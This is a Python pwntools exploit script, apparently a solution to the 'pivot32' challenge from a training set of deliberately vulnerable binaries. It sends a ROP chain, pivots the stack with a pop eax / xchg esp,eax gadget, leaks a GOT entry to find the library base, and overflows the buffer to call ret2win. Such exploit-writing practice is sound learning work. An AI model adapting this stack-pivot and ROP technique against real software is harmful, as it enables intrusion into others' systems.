#!/usr/bin/env python

from pwn import *
import re

p = process("./pivot32")
data = p.recvuntil("> ")

res = re.findall(r": ([a-z0-9]+)\n", data)
rop_addr = int(res[0], 16)

rop = (
    p32(0x80485f0) + # foothold_function@plt
    p32(0x80485d0) + #  puts@plt
    p32(0x80487f2) +  # pwnme function (again)
    p32(0x0804a024) +  # got.plt of foothold_function
    p32(0x0804a034)  # .data
)

p.sendline(rop)
p.recvuntil("> ")

trigger = (
    "\x90" * 44 +
    p32(0x080488c0) + # pop eax ; ret
    p32(rop_addr) +
    p32(0x080488c2) # xchg esp,eax ; ret
)

p.sendline(trigger)
p.recvuntil("libpivot.so")

data = p.recvuntil("> ")

leak = u32(data[:4])
print("Leak", hex(leak))

base = leak - 0x770
print("Base", hex(base))

ret_to_win = base + 0x967
print("Ret2Win", hex(ret_to_win))

p.sendline("D")

p.recvuntil("> ")
payload = (
    "\x90" * 44 +
    p32(ret_to_win)
)

p.sendline(payload)
print(p.recvall())

p.close()
